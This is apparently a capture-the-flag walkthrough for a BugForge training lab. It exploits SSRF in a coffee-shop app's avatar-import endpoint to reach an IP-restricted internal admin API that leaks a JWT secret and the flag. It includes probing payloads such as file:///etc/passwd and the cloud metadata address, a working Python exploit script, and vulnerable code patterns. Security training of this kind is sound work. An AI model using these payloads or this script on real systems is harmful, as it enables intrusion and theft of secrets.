# cafeclub-009 - BugForge Lab Walkthrough

**URL:** https://lab-1785402002715-kuoovs.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Server-Side Request Forgery (SSRF) via avatar-import URL fetch, chained into an internal admin API protected only by source-IP trust
**Flag:** `bug{Rbed8YvtBL2jtC3JmSSfq9me9c31XwM1}`

---

## Summary

CafeClub is a coffee-shop loyalty React SPA. The profile page lets a user set their avatar from a
remote URL. The backend fetches that URL server-side and saves whatever comes back as the user's
avatar file, with a hostname allowlist meant to restrict this to trusted image hosts. The allowlist
blocks public domains, private RFC1918 ranges, and the cloud metadata address, but still permits
`localhost` and `127.0.0.1`. That is enough to reach an internal-only admin API that is gated by a
source-IP check and returns `403 Forbidden` to any external caller. Fetching it through the
avatar-import SSRF returns the admin config, including a JWT signing secret and the flag in
plaintext.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration)
- SQLite
- Loyalty points / gift card economy (unrelated to this bug)
- A separate internal admin API on the same host, trusted purely by source IP

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/profile/avatar/import` | POST | JWT | Fetches an arbitrary URL server-side, stores the response body, returns its new location - **vulnerable** |
| `/admin` | GET | IP-restricted | Returns `403 Forbidden` externally; describes an internal admin API when reached from loopback |
| `/admin/config` | GET | IP-restricted | Dumps service config including `jwt_secret` and the flag when reached from loopback |
| `/admin/health` | GET | IP-restricted | Simple status check, same IP gate |

---

## Discovery

### Step 1 - Map the write/import surface

Registration returns a usable JWT directly. Pulling the JS bundle
(`/static/js/main.4078ec20.js`) and grepping for `/api/` strings surfaced the full route list:
`cart`, `checkout`, `favorites`, `forgot-password`, `giftcards`, `giftcards/purchase`,
`giftcards/redeem`, `login`, `orders`, `products`, `profile`, `profile/avatar`,
`profile/avatar/import`, `profile/password`, `register`, `reset-password`, `verify-token`.

`profile/avatar/import` stood out immediately: it is the only endpoint in the app that accepts an
arbitrary external URL and has the server fetch it on the caller's behalf. Any endpoint that
performs a server-side fetch of a user-supplied URL is a standard SSRF candidate, so it was tested
first among the write endpoints.

```
POST /api/profile/avatar/import
Authorization: Bearer <token>
{"url": "http://example.com/some-image.png"}

-> {"message":"Avatar imported successfully","avatar_url":"/uploads/avatars/<hash>.png"}
```

### Step 2 - Probe the URL validation

Testing the scheme and host checks:

- `file:///etc/passwd` -> `{"error":"Only http(s) URLs are allowed"}` (scheme is checked)
- A public webhook-catcher URL -> `{"error":"Only internal image hosts are allowed"}` (a real
  hostname allowlist, not a blocklist)
- `http://169.254.169.254/latest/meta-data/` -> same allowlist error (cloud metadata blocked)
- A sweep of private ranges (`10.0.0.x`, `172.17-20.0.x`, `192.168.0.x`) on common ports -> all
  blocked with the same allowlist error

Then the loopback address itself:

```
POST /api/profile/avatar/import
{"url": "http://localhost:3000/"}

-> {"message":"Avatar imported successfully","avatar_url":"/uploads/avatars/<hash>.txt"}
```

`localhost` and `127.0.0.1` are permitted by the allowlist, unlike every other private or
metadata address tested. The response body of whatever is fetched is saved to
`/uploads/avatars/<hash>.<ext>` with no content-type or image validation, and that path is
publicly downloadable, so this endpoint acts as a full read-back SSRF primitive against anything
reachable from the server's own loopback interface.

### Step 3 - Look for something behind the loopback boundary

Systematically probing common internal endpoints and ports through the SSRF turned up nothing new
by itself; unmapped paths just fall through to the SPA's client-routing catch-all (a fixed
919-byte `index.html`), and a full local port scan found only the app's own port open. The useful
signal came from comparing behavior on the public domain directly: most guessed paths return the
same SPA catch-all with status `200`, but `GET /admin` returned a distinct, real `403
{"error":"Forbidden"}`. That is not catch-all behavior, it is an actual route enforcing an access
check, and a `403` (rather than `401`) is consistent with an IP/network-based restriction rather
than a missing-credential check.

### Step 4 - Reach it through the SSRF

```
POST /api/profile/avatar/import
{"url": "http://localhost:3000/admin"}
```

The saved file's content:

```json
{"service":"cafeclub-admin-api","version":"1.0","endpoints":["/admin/config","/admin/health"]}
```

A self-describing internal API, reachable only from the app's own loopback interface and blocked
everywhere else. Following the listed `/admin/config` endpoint through the same SSRF:

```
POST /api/profile/avatar/import
{"url": "http://localhost:3000/admin/config"}
```

```json
{
  "service": "cafeclub-admin-api",
  "environment": "production",
  "jwt_secret": "fourthFifth109CheeseKeyLeaf",
  "flag": "bug{Rbed8YvtBL2jtC3JmSSfq9me9c31XwM1}"
}
```

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1785402002715-kuoovs.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# SSRF: server fetches the loopback-only admin API on our behalf
_, body = req("POST", "/api/profile/avatar/import",
              {"url": "http://localhost:3000/admin/config"}, token=token)
avatar_url = json.loads(body)["avatar_url"]

_, leaked = req("GET", avatar_url)
print(leaked)
# -> {"service":"cafeclub-admin-api","environment":"production",
#     "jwt_secret":"fourthFifth109CheeseKeyLeaf",
#     "flag":"bug{Rbed8YvtBL2jtC3JmSSfq9me9c31XwM1}"}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `file://` scheme | Blocked, "Only http(s) URLs are allowed" | Scheme check is solid |
| Public URL (webhook catcher) | Blocked, "Only internal image hosts are allowed" | Real allowlist, not a naive blocklist |
| Cloud metadata IP `169.254.169.254` | Blocked, same allowlist error | Explicitly denied |
| Private RFC1918 ranges on common ports | Blocked, same allowlist error | Not in the allowlist at all |
| Userinfo/subdomain host-confusion tricks (`localhost@host`, `localhost.host`) against the allowlist | Blocked | Hostname is parsed properly, not string-matched |
| Full local port scan (3000-9999, common DB/cache/inspector ports) via the SSRF | Only the app's own port open | No sidecar service; the internal API sits on the same port as everything else |
| Blind path guessing through the SSRF (`/health`, `/.env`, `/api/internal/*`, `/flag`, etc.) | All fall through to the same 919-byte SPA catch-all | Not a useful signal on its own; needed to compare against the direct external response first |

---

## Root Cause

The avatar-import handler validates the target hostname against an allowlist intended for image
CDNs, but the allowlist also accepts loopback addresses:

```javascript
// Vulnerable pattern (approximate)
const ALLOWED_HOSTS = ["images.cafeclub.example", "localhost", "127.0.0.1"];

app.post("/api/profile/avatar/import", authenticate, async (req, res) => {
  const target = new URL(req.body.url);
  if (target.protocol !== "http:" && target.protocol !== "https:") {
    return res.status(400).json({ error: "Only http(s) URLs are allowed" });
  }
  if (!ALLOWED_HOSTS.includes(target.hostname)) {
    return res.status(400).json({ error: "Only internal image hosts are allowed" });
  }
  const upstream = await fetch(target); // runs server-side, from the app's own loopback
  // ...save upstream body, no content-type check...
});
```

Separately, the admin API trusts the source IP of the request instead of requiring credentials:

```javascript
// Vulnerable pattern (approximate)
app.use("/admin", (req, res, next) => {
  if (req.ip !== "127.0.0.1" && req.ip !== "::1") {
    return res.status(403).json({ error: "Forbidden" });
  }
  next();
});
```

Neither check is wrong in isolation, but together they collapse: once any server-side
request-forgery primitive exists on the same host, "the request came from localhost" stops being
a meaningful trust signal, because the SSRF-capable endpoint's outbound requests always come from
localhost by definition. The admin config response additionally returns the JWT signing secret in
plaintext, which is its own exposure even for a legitimately trusted caller.

---

## CWE / OWASP

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-284**: Improper Access Control (source-IP-only trust boundary)
- **CWE-200**: Exposure of Sensitive Information (JWT secret in an internal config response)
- **OWASP A10:2021** - Server-Side Request Forgery
- **OWASP A01:2021** - Broken Access Control
